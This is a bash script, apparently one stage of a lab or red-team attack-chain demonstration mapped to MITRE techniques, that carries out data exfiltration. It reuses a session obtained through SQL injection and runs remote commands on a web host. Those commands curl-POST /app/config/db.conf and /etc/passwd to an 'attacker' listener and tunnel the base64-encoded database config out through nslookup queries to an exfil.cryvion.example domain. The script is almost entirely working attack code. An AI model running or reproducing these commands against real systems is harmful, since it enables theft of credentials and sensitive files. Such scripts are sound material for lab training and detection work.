#!/bin/bash
# Stage 9 — Exfiltration
#   (a) Data exfil over HTTP to attacker C2          (MITRE T1041)
#   (b) DNS-tunnelling demonstration                  (MITRE T1048.003)
source "$(dirname "$0")/lib.sh"
banner "STAGE 9 — EXFILTRATION (T1041 / T1048)"

[ -f "$COOKIE" ] || sqli_login || { err "need a session"; exit 1; }

log "Starting the attacker exfil listener on :${ATTACKER_LISTEN_PORT} ..."
pkill -f exfil_listener.py 2>/dev/null || true
LOOT="$LOOT" python3 "$(dirname "$0")/exfil_listener.py" "$ATTACKER_LISTEN_PORT" &
sleep 1

log "(a) Exfiltrating sensitive files FROM the web host TO attacker C2 over HTTP ..."
rce "curl -s -X POST --data-binary \"\$(cat /app/config/db.conf)\" http://attacker:${ATTACKER_LISTEN_PORT}/exfil/db.conf >/dev/null && echo sent-db.conf"
rce "curl -s -X POST --data-binary \"\$(cat /etc/passwd)\" http://attacker:${ATTACKER_LISTEN_PORT}/exfil/passwd >/dev/null && echo sent-passwd"

echo
log "(b) DNS-tunnelling demonstration (data encoded into DNS queries) ..."
rce "for c in \$(cat /app/config/db.conf | base64 | head -c 60 | fold -w20); do nslookup \$c.exfil.cryvion.example >/dev/null 2>&1; done; echo dns-queries-sent" || true

sleep 1
echo
ok "Exfil received by attacker C2:"
[ -f "$LOOT/09-exfil-received.log" ] && head -20 "$LOOT/09-exfil-received.log"
pkill -f exfil_listener.py 2>/dev/null || true
ok "Exfiltration complete — see $LOOT/09-exfil-received.log"
